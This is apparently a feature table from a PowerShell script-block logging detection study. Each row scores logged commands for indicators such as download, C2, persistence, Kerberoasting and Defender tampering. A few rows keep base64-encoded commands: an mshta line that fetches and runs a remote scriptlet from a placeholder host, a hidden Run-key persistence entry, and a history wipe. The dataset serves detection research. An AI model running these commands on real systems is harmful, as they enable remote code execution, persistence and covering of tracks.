id,lexical_input_source,analysis_length,line_count,token_count,special_char_count,special_char_ratio,digit_ratio,whitespace_ratio,entropy,quoted_literal_count,short_literal_count,joined_literal_length,base64_candidate_count,longest_base64_candidate,decoded_view_count,backtick_count,concat_operator_count,join_operator_count,format_operator_count,char_cast_count,suspicious_mixed_case_count,suspicious_mixed_case_tokens,execution_hit_count,execution_hits,raw_execution_hit_count,recovered_execution_hit_count,decoded_execution_hit_count,download_hit_count,download_hits,raw_download_hit_count,recovered_download_hit_count,decoded_download_hit_count,network_c2_hit_count,network_c2_hits,raw_network_c2_hit_count,recovered_network_c2_hit_count,decoded_network_c2_hit_count,defense_evasion_hit_count,defense_evasion_hits,raw_defense_evasion_hit_count,recovered_defense_evasion_hit_count,decoded_defense_evasion_hit_count,persistence_hit_count,persistence_hits,raw_persistence_hit_count,recovered_persistence_hit_count,decoded_persistence_hit_count,credential_access_hit_count,credential_access_hits,raw_credential_access_hit_count,recovered_credential_access_hit_count,decoded_credential_access_hit_count,lolbin_hit_count,lolbin_hits,raw_lolbin_hit_count,recovered_lolbin_hit_count,decoded_lolbin_hit_count,collection_hit_count,collection_hits,raw_collection_hit_count,recovered_collection_hit_count,decoded_collection_hit_count,remote_execution_hit_count,remote_execution_hits,raw_remote_execution_hit_count,recovered_remote_execution_hit_count,decoded_remote_execution_hit_count,discovery_hit_count,discovery_hits,raw_discovery_hit_count,recovered_discovery_hit_count,decoded_discovery_hit_count,indicator_category_count,high_risk_category_count,raw_indicator_hit_count,indicator_hit_count,recovered_indicator_hit_count,decoded_indicator_hit_count
PST-238,windows_event_4104_scriptblocktext,135,1,17,34,0.251852,0.0,0.022222,4.782496,1,0,95,0,0,0,4,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,mshta,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-239,windows_event_4104_scriptblocktext,178,1,12,24,0.134831,0.044944,0.044944,5.269639,2,0,85,1,64,1,0,0,0,0,0,2,FromBase64String;VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAZQBzAHQAIABvAG4AbAB5ACcA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-240,windows_event_4104_scriptblocktext,150,1,19,13,0.086667,0.006667,0.126667,4.450153,2,0,101,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,credential;password,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0
PST-241,windows_event_4104_scriptblocktext,162,1,15,12,0.074074,0.012346,0.092593,4.65639,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-242,windows_event_4104_scriptblocktext,116,1,10,10,0.086207,0.025862,0.086207,4.712387,1,1,16,0,0,0,0,0,0,0,0,1,Get-CimInstance,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-243,windows_event_4104_scriptblocktext,125,1,15,23,0.184,0.024,0.072,4.820521,2,0,74,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-244,windows_event_4104_scriptblocktext,107,1,12,30,0.280374,0.018692,0.037383,4.615869,1,0,66,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-245,windows_event_4104_scriptblocktext,345,1,42,96,0.278261,0.011594,0.043478,5.311818,14,3,236,0,0,0,18,0,1,0,0,7,CaB1AHQAiAa;EuAuGbuaC;NEw-scHedUleDTaSKa;SqBTAc0aS;UPDaTECHeCk;aDABlAC0atWB1;naFqaSAbFaf,1,encodedcommand,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,new-scheduledtaskaction;register-scheduledtask,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,3,2,0
PST-246,windows_event_4104_scriptblocktext,98,1,10,10,0.102041,0.010204,0.102041,4.659488,1,1,16,0,0,0,0,0,0,0,0,0,,1,get-command,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,2,1,2,2,0,0
PST-247,windows_event_4104_scriptblocktext,299,1,43,87,0.29097,0.006689,0.070234,5.182102,14,8,194,0,0,0,11,0,1,0,0,2,OpENprO;ThESIs.inEr,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,add-type,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-248,windows_event_4104_scriptblocktext,78,1,8,12,0.153846,0.0,0.064103,4.926258,1,0,40,0,0,0,0,0,0,0,0,2,GeT-PRoCESs;selEcT-oBjECt,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-249,windows_event_4104_scriptblocktext,108,1,10,9,0.083333,0.027778,0.092593,4.726761,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-250,windows_event_4104_scriptblocktext,107,1,12,21,0.196262,0.018692,0.065421,4.6882,1,0,69,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,regsvr32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-251,windows_event_4104_scriptblocktext,314,1,10,25,0.079618,0.025478,0.009554,5.025953,1,0,192,1,192,1,0,0,0,0,0,2,FromBase64String;QwBsAGUAYQByAC0ASABpAHMAdABvAHIAeQA7ACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAKABHAGUAdAAtAFAAUwBSAGUAYQBkAEwAaQBuAGUATwBwAHQAaQBvAG4AKQAuAEgAaQBzAHQAbwByAHkAUwBhAHYAZQBQAGEAdABoACAALQBGAG8AcgBjAGUA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-252,windows_event_4104_scriptblocktext,131,1,12,25,0.19084,0.083969,0.061069,5.269494,2,0,41,0,0,0,0,0,0,0,0,2,FromBase64String;aW52ZW50b3J5LW5vdGU,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-253,windows_event_4104_scriptblocktext,366,1,10,26,0.071038,0.04918,0.008197,4.993846,1,0,244,1,244,1,0,0,0,0,0,2,FromBase64String;bQBzAGgAdABhAC4AZQB4AGUAIABqAGEAdgBhAHMAYwByAGkAcAB0ADoAYQA9AEcAZQB0AE8AYgBqAGUAYwB0ACgAJwBzAGMAcgBpAHAAdAA6AGgAdAB0AHAAcwA6AC8ALwBoAHQAYQAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AYQAuAHMAYwB0ACcAKQAuAEUAeABlAGMAKAApADsAYwBsAG8AcwBlACgAKQA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,1,mshta,0,1,1,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,2,1,1
PST-254,windows_event_4104_scriptblocktext,88,1,11,10,0.113636,0.022727,0.125,4.675492,1,1,16,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-255,windows_event_4104_scriptblocktext,61,1,7,7,0.114754,0.0,0.098361,4.555486,0,0,0,0,0,0,0,0,0,0,0,1,AccessToString,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-256,windows_event_4104_scriptblocktext,129,1,11,8,0.062016,0.007752,0.085271,4.505934,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-257,windows_event_4104_scriptblocktext,193,1,24,75,0.388601,0.0,0.031088,5.088044,12,11,94,0,0,0,3,0,1,0,0,3,htA.exAMp;le.InVAl;mSHTa.eXe,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,mshta,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-258,windows_event_4104_scriptblocktext,139,1,17,20,0.143885,0.021583,0.100719,4.665153,2,0,60,0,0,0,2,0,0,0,0,1,ConvertFrom-Csv,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-259,windows_event_4104_scriptblocktext,143,1,16,17,0.118881,0.027972,0.118881,4.756607,2,1,27,0,0,0,0,0,0,0,0,1,Get-CimInstance,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,win32_process,1,0,0,1,0,1,1,0,0
PST-260,windows_event_4104_scriptblocktext,85,1,8,8,0.094118,0.011765,0.094118,4.56948,1,1,16,0,0,0,0,0,0,0,0,1,Get-NetFirewallProfile,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-261,windows_event_4104_scriptblocktext,64,1,7,6,0.09375,0.015625,0.109375,4.487955,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-262,windows_event_4104_scriptblocktext,240,1,35,97,0.404167,0.008333,0.045833,5.086823,14,13,129,0,0,0,7,0,1,0,0,1,amPlE.iN,0,,0,0,0,1,invoke-restmethod,0,1,0,1,checkin,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,0,2,2,0
PST-263,windows_event_4104_scriptblocktext,69,1,5,5,0.072464,0.028986,0.072464,4.579772,0,0,0,0,0,0,0,0,0,0,0,1,Get-CimInstance,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,win32_bios,1,0,0,1,0,1,1,0,0
PST-264,windows_event_4104_scriptblocktext,101,1,11,30,0.29703,0.0,0.158416,4.554216,6,6,24,0,0,0,0,6,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0
PST-265,windows_event_4104_scriptblocktext,66,1,7,7,0.106061,0.015152,0.106061,4.283486,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-266,windows_event_4104_scriptblocktext,232,1,29,92,0.396552,0.0,0.060345,4.869934,14,13,121,0,0,0,5,0,1,0,0,1,geT-cHildiT,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,password;select-string,1,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,0,1,0,2,1,1,3,2,0
PST-267,windows_event_4104_scriptblocktext,181,1,19,60,0.331492,0.0,0.127072,4.511221,11,11,91,0,0,0,0,10,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,mshta,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-268,windows_event_4104_scriptblocktext,184,1,19,49,0.266304,0.0,0.163043,4.520709,11,11,94,0,0,0,0,10,0,0,0,1,Resolve-DnsN,0,,0,0,0,0,,0,0,0,1,resolve-dnsname,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0
PST-269,windows_event_4104_scriptblocktext,104,1,10,11,0.105769,0.009615,0.096154,4.760529,1,1,16,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-270,windows_event_4104_scriptblocktext,181,1,15,18,0.099448,0.01105,0.077348,4.922298,2,0,72,0,0,0,0,0,0,0,0,1,Get-ItemProperty,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,currentversion\run,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,1,0,0,2,1,2,2,0,0
PST-271,windows_event_4104_scriptblocktext,113,1,9,12,0.106195,0.0,0.061947,4.692378,1,0,75,0,0,0,0,0,0,0,0,1,SamAccountName,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,invoke-kerberoast;outputformat hashcat;samaccountname,3,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,3,3,0,0
PST-272,windows_event_4104_scriptblocktext,168,1,17,42,0.25,0.011905,0.047619,4.840484,1,0,122,0,0,0,0,0,0,0,0,0,,0,,0,0,0,1,invoke-restmethod,1,0,0,1,checkin,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0
PST-273,windows_event_4104_scriptblocktext,215,1,19,48,0.223256,0.083721,0.037209,5.503226,1,0,175,0,0,0,0,0,0,0,0,4,StREAm.ReaD;cLIenT.GETsTrEaM;neW-ObjECt;system.nET.sockEts.tCPclIenT,0,,0,0,0,0,,0,0,0,2,getstream;tcpclient,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0
PST-274,windows_event_4104_scriptblocktext,103,1,6,5,0.048544,0.0,0.058252,4.469242,0,0,0,1,25,0,0,0,0,0,0,1,Get-MpPreference,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,disableRealtimeMonitoring,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-275,windows_event_4104_scriptblocktext,94,1,8,6,0.06383,0.010638,0.085106,4.48157,0,0,0,0,0,0,0,0,0,0,0,1,Get-NetRoute,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-276,windows_event_4104_scriptblocktext,25,1,2,2,0.08,0.0,0.04,3.943465,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-277,windows_event_4104_scriptblocktext,211,1,17,52,0.246445,0.009479,0.028436,5.162663,1,0,167,0,0,0,0,0,0,0,0,3,DefaultWebProxy;Net.WebClient;Net.WebRequest,0,,0,0,0,2,downloadstring;webclient,2,0,0,2,defaultwebproxy;user-agent,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,4,4,0,0
PST-278,windows_event_4104_scriptblocktext,121,1,12,10,0.082645,0.016529,0.099174,4.690874,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-279,windows_event_4104_scriptblocktext,83,1,6,6,0.072289,0.024096,0.072289,4.706551,0,0,0,0,0,0,0,0,0,0,0,1,Get-CimInstance,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-280,windows_event_4104_scriptblocktext,115,1,12,10,0.086957,0.017391,0.104348,4.647501,1,1,16,0,0,0,0,0,0,0,0,1,Get-LocalUser,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-281,windows_event_4104_scriptblocktext,220,1,16,41,0.186364,0.004545,0.054545,5.090679,1,0,176,0,0,0,0,0,0,0,0,1,New-ItemProperty,1,windowstyle hidden,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,currentversion\run;new-itemproperty,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-282,windows_event_4104_scriptblocktext,176,1,22,52,0.295455,0.0,0.045455,4.823103,10,10,75,0,0,0,0,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,invoke-kerberoast;outputformat hashcat;samaccountname,0,3,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,3,3,0
PST-283,windows_event_4104_scriptblocktext,260,1,36,100,0.384615,0.05,0.030769,5.241128,14,13,151,0,0,0,4,0,1,0,0,3,MplE.InvaL;OkE-webrEQ;moZilLa,0,,0,0,0,1,invoke-webrequest,0,1,0,1,jitter,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,2,1,0
PST-284,windows_event_4104_scriptblocktext,81,1,9,17,0.209877,0.0,0.049383,4.748568,1,0,35,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-285,windows_event_4104_scriptblocktext,120,1,13,11,0.091667,0.016667,0.108333,4.729671,1,1,16,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-286,windows_event_4104_scriptblocktext,198,1,21,68,0.343434,0.005051,0.025253,4.898798,11,11,92,0,0,0,0,0,1,0,0,0,,1,iex,1,0,0,2,downloadstring;webclient,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,3,2,0
PST-287,windows_event_4104_scriptblocktext,139,1,11,29,0.208633,0.0,0.043165,4.851016,1,0,97,0,0,0,0,0,0,0,0,0,,0,,0,0,0,1,invoke-webrequest,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-288,windows_event_4104_scriptblocktext,83,1,8,6,0.072289,0.012048,0.096386,4.415963,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-289,windows_event_4104_scriptblocktext,121,1,11,10,0.082645,0.033058,0.090909,4.723446,1,1,16,0,0,0,0,0,0,0,0,2,Get-CimInstance;HotFixID,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-290,windows_event_4104_scriptblocktext,85,1,8,6,0.070588,0.011765,0.094118,4.381688,0,0,0,0,0,0,0,0,0,0,0,1,Get-DnsClientCache,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-291,windows_event_4104_scriptblocktext,83,1,11,10,0.120482,0.024096,0.13253,4.675361,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-292,windows_event_4104_scriptblocktext,104,1,16,22,0.211538,0.067308,0.038462,4.930525,1,0,76,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-293,windows_event_4104_scriptblocktext,223,1,27,56,0.251121,0.080717,0.035874,5.186104,1,0,183,0,0,0,8,0,0,0,0,2,ient.GetStr;stem.Net.Sockets.TcpClient,0,,0,0,0,0,,0,0,0,2,getstream;tcpclient,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0
PST-294,windows_event_4104_scriptblocktext,208,1,26,81,0.389423,0.0,0.043269,5.010435,14,13,101,0,0,0,4,0,1,0,0,0,,0,,0,0,0,1,invoke-webrequest,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0
PST-295,windows_event_4104_scriptblocktext,58,1,6,6,0.103448,0.017241,0.086207,4.439349,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-296,windows_event_4104_scriptblocktext,268,1,26,78,0.291045,0.0,0.115672,4.877379,11,5,180,0,0,0,0,10,0,1,0,0,,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0
PST-297,windows_event_4104_scriptblocktext,594,1,10,27,0.045455,0.02862,0.005051,4.830417,1,0,472,1,472,1,0,0,0,0,0,2,FromBase64String;TgBlAHcALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AJwAgAC0ATgBhAG0AZQAgACcAVQBwAGQAYQB0AGUAQwBoAGUAYwBrACcAIAAtAFYAYQBsAHUAZQAgACcAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARgBpAGwAZQAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABzAHQAYQBnAGUALgBwAHMAMQAnAA,1,windowstyle hidden,0,1,1,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,2,currentversion\run;new-itemproperty,0,2,2,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,3,1,4,3,3
PST-298,windows_event_4104_scriptblocktext,122,1,14,12,0.098361,0.016393,0.106557,4.770496,1,1,16,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-299,windows_event_4104_scriptblocktext,162,1,16,39,0.240741,0.0,0.067901,5.028722,1,0,116,0,0,0,0,0,0,0,0,4,PaSsWord;SELeCT-STrING;get-chiLdIteM;inClUdE,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,password;select-string,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,2,1,3,3,0,0
PST-300,windows_event_4104_scriptblocktext,265,1,24,78,0.29434,0.067925,0.10566,4.994655,11,5,175,0,0,0,0,10,0,0,0,1,System.Net.Soc,0,,0,0,0,0,,0,0,0,2,getstream;tcpclient,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0
